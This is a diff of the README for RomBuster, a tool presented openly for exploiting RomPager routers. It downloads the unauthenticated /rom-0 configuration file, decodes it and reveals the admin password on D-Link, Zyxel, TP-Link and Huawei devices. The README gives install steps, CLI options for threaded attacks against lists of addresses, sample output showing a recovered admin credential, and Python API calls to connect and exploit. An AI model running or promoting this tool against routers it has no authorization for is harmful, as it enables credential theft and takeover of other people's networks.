@@ -1,6 +1,12 @@
 # RomBuster
 
-**RomBuster** is a `RomPager` exploitation tool that allows to disclosure network router admin password.
+RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password.
+
+## Features
+
+* Exploits vulnerabilities in most popular router models with RomPager installation such as `D-Link`, `Zyxel`, `TP-Link` and `Huawei`.
+* Optimized to exploit multiple routers at one time from list with threading enabled.
+* Simple CLI and API usage.
 
 ## Installation
 
@@ -8,7 +14,9 @@
 pip3 install git+https://github.com/EntySec/RomBuster
 ```
 
-## RomBuster CLI
+## Basic usage
+
+To use RomBuster just type `rombuster` in your terminal.
 
 ```shell
 usage: rombuster [-h] [--threads] [--output OUTPUT] [--input INPUT] [--address ADDRESS]
@@ -22,6 +30,8 @@ optional arguments:
   --input INPUT      Input file of addresses.
   --address ADDRESS  Single address.
 ```
+
+### Examples
 
 Let's hack my router just for fun.
 
@@ -38,11 +48,22 @@ rombuster --address 192.168.2.1
 [i] (192.168.2.1) - admin:SuperHardPassword999
 ```
 
-Oh, looks like it vulnerable to this vulnerability.
+## RomBuster API
 
-## RomBuster
+RomBuster also has their own Python API that can be invoked by importing RomBuster to your code:
 
-Let's do this again, but through API.
+```python
+from rombuster import RomBuster
+```
+
+### Basic functions
+
+There are all RomBuster basic functions that can be used to exploit specified device.
+
+* `connect(host)` - Connect specified defice by netword address.
+* `exploit(device)` - Exploit connected device.
+
+### Examples
 
 ```python
 from rombuster import RomBuster
@@ -53,7 +74,7 @@ device = rombuster.connect('192.168.2.1')
 print(rombuster.exploit(device))
 ```
 
-## Vulnerability disclosure
+## Vulnerability details
 
 Vulnerability that exploits **RomBuster** exists nowadays in some popular routers all over the world. This vulnerability allows you to download `/rom-0` RomPager configuration file without authentication. **RomBuster** downloads this file, decodes it and giving you password of the router `admin`. Pretty easy way to access main network interface - router.
 
